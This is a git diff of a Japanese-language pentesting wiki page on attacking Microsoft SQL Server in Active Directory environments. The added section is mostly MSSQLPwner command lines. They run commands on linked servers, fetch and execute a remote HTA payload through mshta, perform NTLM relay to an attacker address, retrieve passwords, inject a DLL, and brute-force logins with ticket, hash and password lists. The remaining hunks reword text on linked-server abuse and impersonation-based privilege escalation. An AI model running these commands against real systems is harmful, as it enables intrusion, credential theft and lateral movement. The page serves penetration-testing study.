@@ -21,7 +21,73 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## **MSSQL Enumeration / Discovery**
 
-この場合、PowerShellモジュール[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)は非常に便利です。
+### Python
+[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)ツールはimpacketに基づいており、Kerberosチケットを使用して認証し、リンクチェーンを通じて攻撃することも可能です。
+
+<figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
+```shell
+# Interactive mode
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
+
+# Interactive mode with 2 depth level of impersonations
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth  -max-impersonation-depth 2 interactive
+
+
+# Executing custom assembly on the current server with windows authentication and executing hostname command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname
+
+# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname
+
+# Executing the hostname command using stored procedures on the linked SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname
+
+# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
+
+# Issuing NTLM relay attack on the SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on the local server with custom command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
+
+# Executing direct query
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"
+
+# Retrieving password from the linked server DC01
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password
+
+# Execute code using custom assembly on the linked server DC01
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll
+
+# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using tickets against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt
+
+# Bruteforce using passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
+
+# Bruteforce using hashes against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
+
+```
+### ドメインセッションなしでのネットワークからの列挙
+```
+# Interactive mode
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
+```
+---
+###  Powershell
+
+この場合、powershellモジュール[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)は非常に便利です。
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
@@ -89,9 +155,9 @@ Check in the page mentioned in the **following section how to do this manually.*
 
 ## MSSQL 信頼されたリンク
 
-MSSQL インスタンスが別の MSSQL インスタンスによって信頼されている場合。ユーザーが信頼されたデータベースに対して権限を持っている場合、彼は **信頼関係を利用して他のインスタンスでもクエリを実行することができる**。この信頼は連鎖させることができ、ある時点でユーザーはコマンドを実行できる誤って設定されたデータベースを見つけることができるかもしれない。
+MSSQL インスタンスが別の MSSQL インスタンスによって信頼されている場合。ユーザーが信頼されたデータベースに対して権限を持っている場合、**信頼関係を利用して他のインスタンスでもクエリを実行できるようになります**。この信頼は連鎖させることができ、ユーザーはコマンドを実行できるような誤設定されたデータベースを見つけることができるかもしれません。
 
-**データベース間のリンクは、フォレストの信頼を越えても機能する。**
+**データベース間のリンクは、フォレストトラストを越えても機能します。**
 
 ### Powershell 悪用
 ```powershell
@@ -159,7 +225,7 @@ EXEC sp_linkedservers;
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 {% hint style="warning" %}
-ダブルクォートとシングルクォートの使用場所を確認してください。それらをそのように使用することが重要です。
+ダブルクォートとシングルクォートがどこで使用されているか確認してください。それらをそのように使用することが重要です。
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (643).png>)
@@ -184,9 +250,9 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 ```
 ## ローカル特権昇格
 
-**MSSQLローカルユーザー**は通常、**`SeImpersonatePrivilege`**と呼ばれる特別な種類の特権を持っています。これにより、アカウントは「認証後にクライアントを偽装する」ことができます。
+**MSSQLローカルユーザー**は通常、**`SeImpersonatePrivilege`**と呼ばれる特別なタイプの特権を持っています。これにより、アカウントは「認証後にクライアントを偽装する」ことができます。
 
-多くの著者が考案した戦略は、攻撃者が作成した悪意のあるまたは中間者サービスにSYSTEMサービスを認証させることです。この悪意のあるサービスは、SYSTEMサービスが認証を試みている間にそのサービスを偽装することができます。
+多くの著者が考案した戦略は、SYSTEMサービスに攻撃者が作成した悪意のあるまたは中間者サービスに認証させることです。この悪意のあるサービスは、SYSTEMサービスが認証を試みている間にそのサービスを偽装することができます。
 
 [SweetPotato](https://github.com/CCob/SweetPotato)には、Beaconの`execute-assembly`コマンドを介して実行できるこれらのさまざまな技術のコレクションがあります。
 
